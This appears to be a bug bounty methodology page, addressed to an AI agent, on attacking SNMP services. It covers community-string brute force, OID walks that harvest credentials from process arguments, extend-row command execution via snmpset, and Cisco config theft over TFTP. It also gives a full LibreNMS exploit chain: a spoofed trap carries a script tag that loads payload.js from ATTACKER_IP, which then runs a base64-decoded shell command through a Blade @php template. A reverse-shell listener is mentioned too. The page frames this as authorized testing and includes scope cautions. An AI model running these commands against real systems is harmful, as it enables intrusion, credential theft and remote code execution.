---
technology: "SNMP"
kind: bug-bounty-methodology
last-refresh: "2026-11-19"
audience: ai-agent
family: network-services
provenance: "evidence-grounded (rwcommunity + nsExtendObjects exec RCE; brute-forced 'internal' string → blind RCE in container; public walk → extend 'monitoring' script abuse → root via cron'd script; JetDirect password OID + exec; public walk → Nagios; snmp-check sweep; device agent banner; snmpwalk enum) + upstream-verified (net-snmp snmpd.conf(5) exec/extend/execfix semantics, NET-SNMP-EXTEND-MIB OID .1.3.6.1.4.1.8072.1.3.2 and dynamic SET configuration; Cisco 'How To Copy Configurations Using SNMP' — CISCO-CONFIG-COPY-MIB ccCopyTable workflow replacing OLD-CISCO-SYSTEM-MIB). Companion overview: [[snmp|SNMP]]. Enrichment pass 1, 2026-11-12. Enrichment pass 2, 2026-11-19: walk-to-attack-surface TTP supplement (community-string discovery craft, the recon-goldmine OID family map, SNMPv3 engine/user enumeration as its own class, write-path danger classes, topology-disclosure evidence capture, CTF notes) — current-year advisories researched."
source: "six2dez/pentest-book (enumeration/ports.md, no license — rewritten with attribution), accessed 2026-11-13; standard-MIB OIDs verified against net-snmp MIB tree and RFC 1213/2863/2790/3414; CVE-2025-68615 verified against net-snmp release notes + distro trackers (2026-11-19)"
---

# SNMP bug bounty methodology

Target model: 161/udp agent (net-snmp on Linux, embedded daemons, Cisco IOS). v1/v2c
community strings unless a walk proves v3/USM. All commands read-only or against owned
targets.

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| Default/guessable ro string | `public`, org names | effectively | Full host intel dump — recon→foothold intel |
| Brute-forced string | wordlist vs no lockout | yes | Same, on hardened strings |
| rw community write | rwcommunity leaked/guessed | string only | Config change + extend-row creation → RCE — Critical |
| net-snmp extend/exec RCE | existing extend rows, or rw string to add one | string only | Command execution as snmpd user — Critical |
| Cisco config theft | rw string on IOS device | string only | running-config incl. all secrets — Critical |
| Device password disclosure | printer OIDs under ro string | yes | Admin creds for telnet/web — High |
| v1/v2c accepted at all | no USM | — | Plaintext string capture on-path |
| SNMP trap injection (162/udp) | snmptrapd + unauthenticated consumer (LibreNMS ≤22.10.0) | yes (spoofed source) | Stored XSS → RCE as monitoring user — Critical |

## Phase 0 — Probe and version

```bash
nmap -sU -sV -p 161 198.51.100.10        # "161/udp open snmp SNMPv1 server (public)"
snmpwalk -v2c -c public 198.51.100.10    # answer = full walk; timeout = try v1/strings
onesixtyone -c community.txt 198.51.100.10   # fast string spray (tool named in prose)
```

Observed once: `public` failed, wordlist spray found `internal`. Default order: public,
private, cisco, <org-name>, <hostname>; then dictionary. No lockout exists on stock
agents.

## Phase 1 — Walk the high-value OIDs

```bash
snmpwalk -v2c -c public 198.51.100.10 .1.3.6.1.2.1.1    # system: sysDescr, sysName, uptime
snmpwalk -v2c -c public 198.51.100.10 .1.3.6.1.2.1.25.4.2  # hrSWRun: PROCESS TABLE with paths/args
snmpwalk -v2c -c public 198.51.100.10 .1.3.6.1.2.1.2.2.1  # interfaces + MACs
snmpwalk -v2c -c public 198.51.100.10 .1.3.6.1.2.1.25.6.3  # installed software
snmpwalk -v2c -c public 198.51.100.10 nsExtendObjects    # operator-configured commands
```

What each pays: sysDescr pins OS/firmware (observed); the process table leaks
usernames, service binaries, and custom scripts (Nagios internals observed;
one `/usr/bin/monitor` extend script and its arguments observed); interfaces map the
segment. `snmp-check` automates the sweep with a tidy report (observed). On HP
JetDirect printers, the telnet admin password sits in a vendor OID under the default
community (observed — hex blob, binascii-decode → password → telnet login).

## Phase 2 — net-snmp extend/exec: read it, then run it

snmpd.conf(5): `extend [MIBOID] NAME PROG ARGS` registers a command whose output the
agent returns under NET-SNMP-EXTEND-MIB (nsExtendObjects, OID root .1.3.6.1.4.1.8072.1.3.2);
the older `exec` directive does the same under a legacy table. Both mean: **the agent
runs commands when OIDs are read.**

- Enumerate first: `snmpwalk ... nsExtendObjects` lists every NAME, command path, and
  args the operator configured (one observed walk went straight into
  `extend test1 /bin/echo Hello, world!`).
- Output is an argument oracle: if the extend command interpolates anything
  attacker-influenceable (an observed monitoring script read a config you could influence),
  injection lands in shell context.
- rw string? snmpd.conf(5) documents that extend/extendfix rows "can be configured
  dynamically, using SNMP SET requests" — create your own row
  (`nsExtendCommand`/`nsExtendArgs` via snmpset, then trigger nsExtendRunType
  run-command) and the agent executes it. This is the documented feature, not a bug.

## Phase 3 — rw community: write attacks

With a rw string (leak class: one engagement found `rwcommunity SuP3RPrivCom90` via an
arbitrary file read; guess class: `private`):

```bash
snmpset -v2c -c RWSTRING 198.51.100.10 nsExtendStatus.$(echo -n "pwn" | xxd -p) i 5   # create row (illustrative)
snmpwalk -v2c -c RWSTRING 198.51.100.10 nsExtendOutput1Table                          # collect output
```

Beyond extend rows, write targets in the wild: interface up/down (DoS), SNMPv3 user
creation, and on embedded kit full config rewrites. Keep it non-destructive: create,
collect, delete.

## Phase 4 — Cisco config theft via SNMP (verified workflow)

Cisco documents this officially for IOS 12.0+ ("How To Copy Configurations To and From
Cisco Devices Using SNMP"): with the **rw** community string, build a ccCopyTable row via
snmpset that copies `running-config` (source type 4) to a destination file type 1 on your
TFTP server:

```bash
# classic three-step on CISCO-CONFIG-COPY-MIB (per Cisco doc 15217):
snmpset -v2c -c RWSTRING 198.51.100.10 ccCopyProtocol.<N> i 1 \
        ccCopySourceFileType.<N> i 4 ccCopyDestFileType.<N> i 1 \
        ccCopyServerAddress.<N> a 198.51.100.99 ccCopyFileName.<N> s "cfg" \
        ccCopyEntryRowStatus.<N> i 4        # createAndGo → device TFTPs its config to you
# then tftp fetch on your side; cfg contains all local secrets incl. every community string
```

The deprecated path (OLD-CISCO-SYS-MIB / `write net`) still answers on ancient images.
Verify the MIB support per image before claiming it — the doc above is the ground truth
for modern IOS. A pulled config typically contains enable secrets, vty ACLs, and every
community string: the recon→write loop closes in one file.

## Phase 5 — On-path and v3 context

v1/v2c strings cross the wire in cleartext — any segment position (ARP spoof, rogue AP)
harvests them from live management traffic, no brute force needed. If the agent answers
only v3, USM usernames are enumerable in some configs (`snmpwalk -v3` with noAuthNoPriv
against the snmpEngineID table); cracking auth hashes offline (hashcat mode 25100-family)
is the remaining path — otherwise move on.

## Phase 6 — Trap injection into monitoring pipelines (162/udp)

Traps are the unsolicited direction of SNMP: devices send them to a manager
on 162/udp, and in the stock `snmptrapd` default configuration that ships
with monitoring stacks they are accepted **without authentication** — the
sender only needs the source address of a monitored device. LibreNMS (SNMP
traps enabled) is the canonical consumer.

```bash
# 1. Confirm the receiver and the consumer
netstat -ulnp | grep 162        # udp 0.0.0.0:162 — snmptrapd listening
# LibreNMS: /etc/nginx/conf.d/ routes to the internal app port; web UI About → version
# enumerate monitored device IPs — the source addresses a trap may speak as
```

LibreNMS ≤ 22.10.0 (fixed in 22.11.0) renders trap fields into the eventlog
without output encoding: a varbind value carrying a `<script>` tag becomes
stored XSS that fires in an authenticated admin session the moment the
Eventlog page is viewed (Sonar Source disclosure; unauthenticated → stored
XSS → RCE). The escalation to code execution exists because LibreNMS's
Alert Templates feature renders user-supplied **Blade** templates inline
(`Blade::render($vars['template'])` in the ajax form handler) — the injected
JavaScript just POSTs a template containing `@php ... @endphp`.

```python
# 2. Craft and send the trap (scapy; speaking as a monitored device)
from scapy.all import *
TARGET, SOURCE = "198.51.100.10", "198.51.100.20"   # monitoring host, monitored device
PAYLOAD = 'sys<script src=http://ATTACKER_IP:8000/payload.js></script>;'
vl = [SNMPvarbind(oid=ASN1_OID('1.3.6.1.6.3.1.1.4.1.0'), value=ASN1_OID('1.2.3')),
      SNMPvarbind(oid='', value='foo\nSNMPv2-MIB::snmpTrapOID.0 '
                   'HP-ICF-FAULT-FINDER-MIB::hpicfFaultFinderTrap\n'
                   'HP-ICF-FAULT-FINDER-MIB::hpicfFfLogFaultType ' + PAYLOAD)]
send(IP(src=SOURCE, dst=TARGET)/UDP(dport=162)/SNMP(version=1, PDU=SNMPtrapv2(varbindlist=vl)))
# . Sent 1 packets.   — payload now sits in the eventlog waiting for a viewer
```

```javascript
// 3. payload.js — drive the admin session into the alert-template form → Blade @php
fetch('http://127.0.0.1:3000/ajax_form.php', {method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'type=alert-templates&template=@php\nsystem("echo <BASE64> | base64 -d | sh");\n@endphp&name=Probe'})
```

Operational notes:

- Spoofed-UDP sending across a VPN often fails (MTU/routing) — run the
  sender from a foothold inside the network; the same trap then walks in as
  ordinary traffic.
- A `nc -lvnp 9001` listener catches the reverse shell as the monitoring
  service user; from there the app's config (`.custom.env`-style files)
  typically holds database credentials reused elsewhere.
- Even without a rendering bug, injected trap text lands in the NOC's primary
  dashboard — log injection and operator social-engineering are the floor of
  this primitive.

## Ports cheat-sheet additions (2026-11-13)

From six2dez/pentest-book enumeration/ports.md (no license — rewritten with attribution); every NSE and module name verified against the nmap and metasploit repos. snmpwalk/snmp-check/onesixtyone above and the snmp_login/snmp_enum pair already named in the tool map stand — skipped.

- **Windows inventory through the agent** — where the community string lands on a Windows host, the `snmp-win32-*` NSE family turns the agent into a host inventory: snmp-win32-users (local accounts), snmp-win32-services, snmp-win32-shares, snmp-win32-software (installed products) — the Phase 1 OID walks packaged per topic. snmp-netstat and snmp-processes do the same for live connections and the process table.
- **Community-string brute when the spray misses** — nmap's `snmp-brute` script carries its own community dictionary (wordlist overridable via script-args), a step up from hand-rolled onesixtyone loops once the default candidates fail. Add `manager` to the Phase 0 default order — it ships in more vendor configs than its fame suggests.
- **Framework-side device modules** — beyond the snmp_login/snmp_enum pair already named: metasploit's auxiliary/scanner/snmp battery covers vendor-specific loot — cisco_config_tftp (config pull over TFTP) and cisco_upload_file, snmp_enumshares/snmp_enumusers (Windows shares and accounts through SNMP), snmp_enum_hp_laserjet, plus the appliance modules (aix_version, arris_dg950, brocade_enumhash, netopia_enum, sbg6580_enum, cnpilot_r_snmp_loot, epmp1000_snmp_loot, and oki_scanner under scanner/misc). Match the module to the sysDescr string Phase 1 already gave you.

## Command quick reference

```bash
onesixtyone -c strings.txt HOST            # string spray
snmp-check -v2c -c public HOST             # formatted enum sweep
snmpwalk -v2c -c public HOST nsExtendObjects
snmpget/snmpset -v2c -c STRING HOST OID ...   # targeted read/write
```

## Tool mapping (prose)

onesixtyone for community spraying; snmpwalk/snmpget/snmpset (net-snmp suite) for walks
and writes; snmp-check for formatted enumeration; hydra for string brute force where a
spray needs a wordlist engine; Metasploit's snmp_login/snmp_enum auxiliary modules for
pipeline work; a local TFTP daemon for the Cisco config pull; binascii/xdd for printer
password hex decoding (observed). Tools vault owns per-tool pages.

---

## Supplement — walk-to-attack-surface TTP (added 2026-11-19)

*The through-line of this supplement: the string is the lock, but the **walk is the loot**. Most
SNMP bounty value is not RCE — it is a pre-auth, low-noise read of internal topology, software
inventory, and credentials-in-process-arguments that no other external surface hands you. Sources
re-verified at write: net-snmp MIB tree + RFCs 1213/2863/2790/3414 for OIDs; net-snmp release notes
and distro trackers for CVE-2025-68615; hatlord/snmpwn and Metasploit module docs for v3 tooling.
Extends Phases 0, 1 and 5; nothing above was rewritten.*

### S1 — Community-string discovery craft (extends Phase 0)

Phase 0 sprays `public`/`private` first. When those miss, the string is almost always *derived from
the organization*, not random. Build the candidate list in this order, highest hit-rate first:

1. **Stock defaults beyond the famous two:** `public`, `private`, `cisco`, `manager`, `admin`,
   `read`, `write`, `monitor`, `snmp`, `snmpd`, `community`, `secret`, `access`, `all private`,
   `all public`, `ILMI` (Cisco ATM default — answers on more IOS than its obscurity suggests),
   `0`, `default`, `password`.
2. **Organization-pattern guesses** — the class worth building by hand per target. Permute the
   program's own tokens: company short name, ticker, product names, the hostname and its parts
   (`<sysName>`, `<sysName>-ro`, `<sysName>-rw`), the ASN/city/site code from the netblock's WHOIS,
   and seasonal/rotational forms (`<company>2025`, `<company>2026`, `<company>123`). A string you
   derive from the target's own naming convention beats any generic wordlist.
3. **Role suffixes/prefixes** on every candidate: `-ro`, `-rw`, `ro-`, `rw-`, `_read`, `_write`.
   The read-only and read-write strings are frequently the same stem with a different suffix —
   finding the ro string often hands you the rw one by inference (then confirm with S4's
   non-destructive write probe, never a destructive SET).
4. **Dictionary fallback:** SecLists `Discovery/SNMP/snmp.txt` and `common-snmp-community-strings.txt`,
   or the dictionary shipped inside nmap's `snmp-brute` NSE.

```bash
onesixtyone -c strings.txt 198.51.100.10
# -> 198.51.100.10 [corp-ro] Linux edge01 5.15.0-91-generic #101-Ubuntu ...   <- string + sysDescr in one line
onesixtyone -c strings.txt -i targets.txt -w 50     # sweep a /24; -w pads the send rate (keep it modest on a program)

# wordlist engine when a spray needs mutation/rules — name the module, then read its options:
hydra -U snmp                                        # prints THIS build's snmp module options (read/write, version); do not assume tokens
hydra -P strings.txt -t 4 snmp://198.51.100.10       # low thread count; SNMP has no account lockout but UDP floods drop replies
```

**Reality to bake into the report:** stock agents have **no lockout and no failed-auth logging on
v1/v2c** — a guessed string leaves almost no trace, which is exactly why "weak community string" is a
real finding and not a theoretical one. The amplifier line in the report is "guessable + no logging +
no rate limit," not the guess alone. Keep the spray single-pass and low-rate anyway: UDP replies are
lost under load, so hammering *reduces* your hit rate as well as your discipline.

### S2 — SNMPv3 (USM) enumeration as its own discovery class

If the agent answers only v3, community strings are gone — but v3 leaks a username list *before any
password guess*, which is its own pre-auth finding. Two mechanisms, both from RFC 3414's USM model:

**Engine discovery (always unauthenticated).** Every v3 exchange begins with the client learning the
agent's authoritative engine ID; the agent returns it in a Report PDU to a probe carrying an unknown
user at `noAuthNoPriv`. net-snmp does this automatically — dump it with `-d`:

```bash
snmpget -v3 -l noAuthNoPriv -u probe -d 198.51.100.10 1.3.6.1.2.1.1.1.0 2>&1 | grep -A2 msgAuthoritativeEngineID
# the engineID bytes are the discovery prize: they encode the vendor enterprise number and often the
# MAC or an IP — a device fingerprint on their own, readable with zero credentials.
snmpget -v3 -l noAuthNoPriv -u probe 198.51.100.10 1.3.6.1.6.3.10.2.1.1.0   # snmpEngineID.0 directly, where readable
```

**Username enumeration via the USM stats differential.** The agent's Report PDU names *which* USM
counter it incremented, and the counter differs by failure cause:

| Probe | Agent increments | Report OID | Means |
|---|---|---|---|
| Unknown username, noAuthNoPriv | `usmStatsUnknownUserNames` | `1.3.6.1.6.3.15.1.1.3.0` | user does **not** exist |
| Known username, wrong auth key | `usmStatsWrongDigests` | `1.3.6.1.6.3.15.1.1.5.0` | user **exists** — password-guess candidate |

That split is the oracle: walk a username wordlist at `authNoPriv` with a junk password and sort by
which counter comes back. `hatlord/snmpwn` automates exactly this (user list → enum → auth/priv
dictionary attack); Metasploit's `auxiliary/scanner/snmp/snmp_login` tests v3 credentials once you
have candidate users. Where readable, `usmUserTable` (`1.3.6.1.6.3.15.1.2.2`, username column
`.1.3.6.1.6.3.15.1.2.2.1.3`) hands you the list directly. Offline, captured authenticated v3 traffic
feeds hashcat for the auth key — but username enumeration alone is reportable (CWE-200) without ever
cracking a password.

**What differs from v1/v2c for the agent executing this:** there is no "walk the whole tree for free"
step — you enumerate users, then you are gated on an auth key. Report the username disclosure and the
weak-auth posture (MD5 auth / DES priv, or `authNoPriv` with no encryption) and move on; do not run a
large online dictionary against a production agent.

### S3 — The walk as recon goldmine: the OID family map

This is the center of the methodology. A single authorized walk under a read string is a structured
dump of the target's internals. Prefer **snmpbulkwalk** (v2c+) over snmpwalk — it uses GETBULK and is
multiples faster, which matters when you want one clean pass instead of thousands of GETNEXT round
trips:

```bash
snmpbulkwalk -v2c -c corp-ro -Cr50 198.51.100.10 .1 > walk-198.51.100.10-$(date +%Y%m%dT%H%M%S).txt
#   -Cr50 = max-repetitions 50 (tune down if replies truncate); redirect once, analyze offline.
snmpbulkwalk -v2c -c corp-ro -Cr50 198.51.100.10 .1.3.6.1.2.1.4   # scope to one family when the full tree is huge
```

Then mine it by family. Each row below is a GETNEXT-able subtree; the payoff column is what a triager
pays for.

| Family | OID root | Key columns | Recon payoff |
|---|---|---|---|
| System / fingerprint | `.1.3.6.1.2.1.1` | sysDescr `.1.1.0`, sysObjectID `.1.2.0`, sysName `.1.5.0`, sysContact `.1.4.0`, sysLocation `.1.6.0`, sysServices `.1.7.0` | OS+kernel+firmware string; **sysObjectID is the vendor enterprise OID — an exact model pin**; sysContact leaks admin emails/phones; sysServices (a bitmask of OSI layers) separates a router (L3) from an app host (L7) |
| Interfaces | `.1.3.6.1.2.1.2.2.1` (+ IF-MIB `.31`) | ifDescr `.2`, ifPhysAddress/MAC `.6`, ifOperStatus `.8`, ifAlias `.1.3.6.1.2.1.31.1.1.1.18` | every NIC, VLAN sub-interface and tunnel; **ifAlias commonly carries human labels** ("MPLS to DC2", "DMZ-uplink") — a hand-drawn network diagram |
| IP addresses | `.1.3.6.1.2.1.4.20` | ipAdEntAddr `.1.1`, ipAdEntNetMask `.1.3` | every IP the host holds **and its netmask** → the exact size of each attached subnet |
| ARP / neighbor cache | `.1.3.6.1.2.1.4.22` (ipNetToMediaTable) | NetAddress `.1.3`, PhysAddress/MAC `.1.2` | **live neighbor list = the lateral map**: every other host this box has recently talked to on each segment, with MACs for vendor OUI fingerprinting. No scan needed — the device inventories the subnet for you |
| Routing table | `.1.3.6.1.2.1.4.21` (ipRouteTable, legacy but widely answered) / `.1.3.6.1.2.1.4.24.4` (ipCidrRouteTable, modern) | dest, mask, nextHop `.21.1.7` | **internal topology**: every known network and its next hop — including non-RFC1918 internal ranges and management nets you cannot reach from outside. This is the single highest-value topology-disclosure artifact |
| TCP/UDP endpoints | `.1.3.6.1.2.1.6.13` (tcpConnTable), `.1.3.6.1.2.1.7.5` (udpTable) | local/remote addr+port | listening services and established connections → a portless port-scan and a who-talks-to-whom map |
| Running processes | `.1.3.6.1.2.1.25.4.2` (hrSWRunTable) | hrSWRunName `.1.2`, hrSWRunPath `.1.4`, **hrSWRunParameters `.1.5`** | service inventory **and command-line arguments** — see below, the highest-yield column in SNMP |
| Installed software | `.1.3.6.1.2.1.25.6.3` (hrSWInstalledTable) | hrSWInstalledName `.1.2` | version-pinned package list → a CVE shortlist for follow-on, before you touch the host again |
| Storage / mounts | `.1.3.6.1.2.1.25.2.3` (hrStorageTable) | descr, size, used | mount points and backing stores (reveals attached NFS/SMB, container overlay paths) |
| Windows accounts/shares | LanManager MIB `.1.3.6.1.4.1.77.1.2` | users `.25.1.1`, shares `.27`, running programs `.3.1.1` | local usernames, share names and paths, and processes on a Windows agent — the `snmp-win32-*` NSE family and Metasploit `snmp_enumusers`/`snmp_enumshares` wrap these |

**The money column — hrSWRunParameters (`.1.3.6.1.2.1.25.4.2.1.5`).** Processes are listed *with the
arguments they were launched with*. Credentials passed on a command line — database DSNs, `--password`
flags, API tokens, backup-job secrets, connection strings — sit in that column in cleartext, readable
under a read-only string:

```bash
snmpbulkwalk -v2c -c corp-ro 198.51.100.10 .1.3.6.1.2.1.25.4.2.1.5 \
  | grep -iE 'pass|pwd|token|secret|key=|mysql|psql|mongodb|redis-cli|-u |conn'
# HOST-RESOURCES-MIB::hrSWRunParameters.812 = STRING: "--user backup --password S3cr3t! --host db01.internal"
#   ^ cleartext DB credential + an internal hostname (db01.internal) that feeds the S3 topology map
```

Pair the families: ipRouteTable + ipNetToMediaTable + ifAlias reconstruct the internal network;
hrSWInstalled gives you the version-matched CVE list for each host that map reveals; hrSWRunParameters
hands you the credential to reach them. That chain — all pre-auth, all read-only — is the SNMP bounty.

### S4 — Write-path danger classes: report, don't test

A read-write string turns every writable OID into an action. Phases 3–4 cover the destructive ones
(extend-row RCE, Cisco config theft). The discipline for an authorized program is **prove write
access without causing an effect**, then report the dangerous SETs as *reachable*, not by firing them.

**The one safe write PoC — round-trip a cosmetic scalar.** sysLocation/sysContact/sysName are writable,
human-readable, and harmless to change for a few seconds. This is the canonical evidence that a string
is read-write, with full restore:

```bash
OLD=$(snmpget -v2c -c corp-rw -Ovq 198.51.100.10 sysLocation.0)              # 1. capture original
snmpset -v2c -c corp-rw 198.51.100.10 sysLocation.0 s "authorized-poc-2026-11-19"   # 2. prove write
snmpget -v2c -c corp-rw -Ovq 198.51.100.10 sysLocation.0                      # 3. confirm it took
snmpset -v2c -c corp-rw 198.51.100.10 sysLocation.0 s "$OLD"                  # 4. restore immediately
# evidence = the three outputs showing original -> marker -> restored. No service affected.
```

The write targets to **name in the report but not trigger**, by escalating danger:

| Writable OID / table | SET effect | Why report-don't-test |
|---|---|---|
| sysLocation/sysContact/sysName `.1.3.6.1.2.1.1.{6,4,5}.0` | cosmetic string change | the *only* one safe to demonstrate (round-trip above) |
| ifAdminStatus `.1.3.6.1.2.1.2.2.1.7` | SET `down(2)` disables an interface | **DoS** — knocking a link offline is destructive; prove reachability via the ro walk of ifTable, never SET it |
| ipForwarding, ipRouteTable rows | alter routing / blackhole or redirect traffic | network-wide impact; describe the writable row, do not write |
| usmUserTable `.1.3.6.1.6.3.15.1.2.2` | create/clone a v3 user → persistent backdoor | persistence change; report the table as writable |
| nsExtendCommand/nsExtendArgs (Phase 2/3) | **RCE** as the snmpd user | report the primitive; only exercise under explicit RCE-permitted scope |
| ccCopyTable (Phase 4) | exfiltrate running-config | config theft; the MIB's presence under a rw string is the finding |

Rule: once a rw string is confirmed by the cosmetic round-trip, the *existence* of the dangerous
writable OIDs (shown by reading their current values and noting MIB write-access) is the report. You do
not need to fire a destructive SET to prove a destructive SET is possible — and on a bounty you must
not.

### S5 — Evidence capture for topology-disclosure findings

Topology disclosure is the most common SNMP bounty payout and the easiest to under-evidence. Capture
it so a triager can verify without re-running anything:

- **The raw walk, timestamped and hashed.** `snmpbulkwalk ... > walk-<ip>-<ISO8601>.txt` then
  `sha256sum walk-*.txt` — the hash in the report proves the artifact is unaltered.
- **The minimal proving excerpt, not the whole dump.** For a routing/topology finding, quote the
  `ipCidrRouteTable`/`ipNetToMediaTable` rows that reveal internal ranges you could not otherwise see,
  plus `sysName`/`sysDescr` to identify the device. Redact down to the few rows that prove the claim —
  do not paste 10,000 lines, and do not exfiltrate more of the internal map than the PoC needs.
- **The pre-auth framing.** State the exact command and that it needed only a read community string
  (name the string's discovery class from S1: default, derived, or dictionary). "Reachable with
  `snmpget -v2c -c <string>`" is the impact sentence.
- **Impact translation.** Internal subnets + next hops + ARP neighbors = "an external party maps the
  internal network and selects next targets without authentication." For hrSWRunParameters credential
  leaks, the credential value is redacted in the report but its *presence and location* (the OID
  index) is shown. Map to CWE-200 (information exposure); severity rises from Medium (pure topology) to
  High when the walk also leaks live credentials or management-network addresses.
- **Clean up.** Delete captured walks containing real credentials after the report is accepted; never
  retain another org's internal map longer than the disclosure needs.

### S6 — CTF notes

SNMP is a staple of HTB/OSCP-style boxes, and the classic chain is exactly S3's money column:

- **The canonical box pattern:** `onesixtyone` / `snmpwalk -c public -v1` → read
  `hrSWRunParameters` (`.1.3.6.1.2.1.25.4.2.1.5`) → a password sits in a process's command-line args
  (a backup script, a `mysql -p<pw>`, a custom daemon) → use it for SSH/service login. If a walk feels
  empty, re-run with `-v1` — some lab agents answer v1 but not v2c, and vice versa.
- **The second classic:** net-snmp `extend`/`exec` rows (Phase 2) left configured, or a rw string
  (`private`) that lets you *add* one → command execution. CTF boxes often ship the extend row
  pre-made; read `nsExtendObjects` first.
- **What differs from a bounty program:** in a CTF you brute-force strings hard, run full online v3
  dictionaries, and SET freely (including `ifAdminStatus` or extend-RCE) because the box is yours and
  disposable. On an authorized program every one of those is throttled, logged, or destructive — you
  single-shot the spray, you do not online-crack a production v3 agent, and you never fire a
  destructive SET (S4). The *reading* tradecraft is identical; only the aggression and the write
  discipline change.

### S7 — Current-year advisory (depth), older ones one-line

**CVE-2025-68615 (net-snmp `snmptrapd`, current).** A crafted trap packet causes a buffer overflow in
`snmptrapd`, crashing the daemon (DoS; code-execution-in-service-context claimed by some advisories,
treat as reported not confirmed). **Fixed in net-snmp 5.9.5 and 5.10.pre2** (distro backports: Debian
bookworm `5.9.3+dfsg-2+deb12u1`, trixie `5.9.4+dfsg-2+deb13u1`; Red Hat RHSA-2026:0926). This is the trap-side
companion to Phase 6: a 162/udp receiver running an unpatched `snmptrapd` is a single-packet crash,
and the Phase 6 spoofed-trap plumbing is the delivery path — fingerprint the trap daemon version
(sysDescr of the monitoring host, or the stack's package list via its own SNMP agent) before claiming
it. One-line historical context only, per current-year focus: the older net-snmp Agent-X and
`_parse_octet_string`/`snmp_pdu` memory bugs and the perennial default-community exposures predate this
window and are covered by the walk/extend methodology above — do not lead a report with a >1-year-old
net-snmp CVE when the live misconfiguration (guessable string, readable topology, extend-row RCE) is
the stronger, present finding.

### References (supplement)

- net-snmp 5.9.5 / 5.10.pre2 release announcement (CVE-2025-68615) — https://www.mail-archive.com/net-snmp-users@lists.sourceforge.net/msg33548.html
- CVE-2025-68615, Debian security tracker — https://security-tracker.debian.org/tracker/CVE-2025-68615
- CVE-2025-68615, Red Hat (RHSA-2026:0926) — https://access.redhat.com/security/cve/CVE-2025-68615
- RFC 3414 (USM for SNMPv3): usmStats counters and engine discovery — https://www.rfc-editor.org/rfc/rfc3414
- RFC 1213 / RFC 2863 (IF-MIB) / RFC 2790 (HOST-RESOURCES-MIB): standard OID trees walked in S3
- hatlord/snmpwn (SNMPv3 user enumeration + auth/priv dictionary attack) — https://github.com/hatlord/snmpwn
- Metasploit scanner/snmp modules (snmp_login, snmp_enum, snmp_enumusers, snmp_enumshares) — https://www.rapid7.com/db/modules/auxiliary/scanner/snmp/snmp_enumusers/
- onesixtyone — https://github.com/trailofbits/onesixtyone
- THC-hydra (snmp module options via `hydra -U snmp`; README lists only "SNMP v1+v2+v3") — https://github.com/vanhauser-thc/thc-hydra

*Supplement added 2026-11-19 (walk-to-attack-surface TTP): community-string discovery craft,
SNMPv3/USM engine and username enumeration as its own class, the recon-goldmine OID family map
(interfaces/ARP → lateral mapping, ipRouteTable → topology, hrSWRunParameters → command-line credential
leaks, hrSWInstalled → follow-on CVE shortlist, sysServices/sysObjectID fingerprinting), write-path
danger classes with a non-destructive round-trip PoC, topology-disclosure evidence capture, and CTF
notes. Sources: net-snmp release notes + Debian/Red Hat trackers for CVE-2025-68615; RFCs
1213/2863/2790/3414 and the net-snmp MIB tree for OIDs; hatlord/snmpwn, Metasploit module docs,
onesixtyone and THC-hydra for tooling — all consulted/verified 2026-11-19. Model: claude-opus-4-8.*
